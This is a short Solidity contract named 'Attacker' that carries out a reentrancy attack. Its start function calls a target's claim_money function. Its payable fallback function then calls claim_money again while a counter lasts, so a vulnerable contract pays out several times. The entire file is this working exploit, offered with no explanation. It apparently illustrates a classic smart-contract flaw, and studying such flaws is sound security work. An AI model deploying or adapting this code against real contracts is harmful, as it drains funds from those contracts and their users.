pragma solidity ^0.4.0;

contract Attacker {
    int callsLeft = 2;
    
    function () payable public {
        if (callsLeft > 0) {
            callsLeft -= 1;
            claim_money(msg.sender);
        }
    }
    
    function start(address a) public {
        claim_money(a);
    }
    
    function claim_money(address a) private {
        require(a.call(bytes4(keccak256("claim_money()"))));
    }
}
